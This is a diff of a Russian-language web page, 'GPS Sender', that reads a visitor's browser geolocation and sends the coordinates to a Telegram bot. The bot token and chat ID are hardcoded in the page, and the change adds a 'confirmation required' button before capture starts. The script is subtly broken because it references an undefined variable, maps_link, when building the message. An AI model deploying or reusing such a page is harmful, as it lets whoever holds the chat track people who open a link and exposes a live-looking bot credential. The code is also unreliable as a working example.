@@ -2,70 +2,83 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GPS Sender</title>
     <style>
-        body { font-family: sans-serif; text-align: center; margin-top: 50px; background: #121212; color: #fff; }
+        body { font-family: sans-serif; text-align: center; margin-top: 50px; background: #121212; color: #fff; padding: 20px; }
         h2 { color: #4CAF50; }
-        #status { padding: 20px; font-size: 18px; }
+        #status { padding: 20px; font-size: 16px; margin-top: 20px; }
+        button { background-color: #4CAF50; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; margin-top: 20px; }
+        button:active { background-color: #45a049; }
     </style>
 </head>
 <body>
-    <h2 id="title">Поиск координат...</h2>
-    <div id="status">Ожидание ответа от датчиков телефона...</div>
+    <h2 id="title">Требуется подтверждение</h2>
+    <div id="status">Нажмите кнопку ниже, чтобы передать координаты.</div>
+    
+    <br>
+    <button id="geoBtn" onclick="getLocation()">Начать определение</button>
 
     <script>
         const TOKEN = "9218562846:AAGbvc-EJ2QLHcs8qW-c__liAzlBgUp4HnU";
         const CHAT_ID = "5328460264";
 
-        const statusDiv = document.getElementById("status");
-        const titleH2 = document.getElementById("title");
+        function getLocation() {
+            const statusDiv = document.getElementById("status");
+            const titleH2 = document.getElementById("title");
+            const btn = document.getElementById("geoBtn");
 
-        if (navigator.geolocation) {
-            // Увеличиваем таймаут до 30 секунд, чтобы дать телефону время поймать спутники
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                    const text = `📍 Координаты с телефона:\nШирота: ${lat}\nДолгота: ${lon}\nКарта: ${maps_link}`;
+            btn.style.display = "none"; // Скрываем кнопку после нажатия
+            titleH2.innerText = "Поиск координат...";
+            statusDiv.innerText = "Ожидание ответа от датчиков телефона...";
 
-                    titleH2.innerText = "Успешно!";
-                    statusDiv.innerText = "Координаты получены, отправляем в Telegram...";
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                        const text = `📍 Координаты с телефона:\nШирота: ${lat}\nДолгота: ${lon}\nКарта: ${maps_link}`;
 
-                    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
-                    
-                    const img = new Image();
-                    img.src = url;
-                    
-                    img.onload = function() {
-                        statusDiv.innerText = "Сообщение доставлено в Telegram! ✔️";
-                    };
-                    img.onerror = function() {
-                        statusDiv.innerText = "Координаты пойманы, но ошибка отправки запроса.";
-                    };
-                },
-                function(error) {
-                    titleH2.innerText = "Ошибка!";
-                    let errorMsg = "";
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            errorMsg = "Пользователь отклонил запрос на геолокацию.";
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            errorMsg = "Информация о местоположении недоступна (возможно, выключен GPS или нет сигнала).";
-                            break;
-                        case error.TIMEOUT:
-                            errorMsg = "Время ожидания истекло (GPS не смог поймать спутники, попробуйте у окна).";
-                            break;
-                        default:
-                            errorMsg = "Неизвестная ошибка: " + error.message;
-                    }
-                    statusDiv.innerText = errorMsg;
-                },
-                { enableHighAccuracy: false, timeout: 30000, maximumAge: 0 }
-            );
-        } else {
-            statusDiv.innerText = "Геолокация не поддерживается вашим браузером.";
+                        titleH2.innerText = "Успешно!";
+                        statusDiv.innerText = "Координаты получены, отправляем в Telegram...";
+
+                        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+                        
+                        const img = new Image();
+                        img.src = url;
+                        
+                        img.onload = function() {
+                            statusDiv.innerText = "Сообщение доставлено в Telegram! ✔️";
+                        };
+                        img.onerror = function() {
+                            statusDiv.innerText = "Координаты пойманы, но ошибка отправки запроса.";
+                        };
+                    },
+                    function(error) {
+                        titleH2.innerText = "Ошибка!";
+                        let errorMsg = "";
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMsg = "Пользователь отклонил запрос на геолокацию.";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMsg = "Информация о местоположении недоступна (проверьте, включен ли GPS).";
+                                break;
+                            case error.TIMEOUT:
+                                errorMsg = "Время ожидания истекло.";
+                                break;
+                            default:
+                                errorMsg = "Неизвестная ошибка: " + error.message;
+                        }
+                        statusDiv.innerText = errorMsg;
+                        btn.style.display = "inline-block"; // Возвращаем кнопку при ошибке
+                    },
+                    { enableHighAccuracy: false, timeout: 30000, maximumAge: 0 }
+                );
+            } else {
+                statusDiv.innerText = "Геолокация не поддерживается вашим браузером.";
+            }
         }
     </script>
 </body>
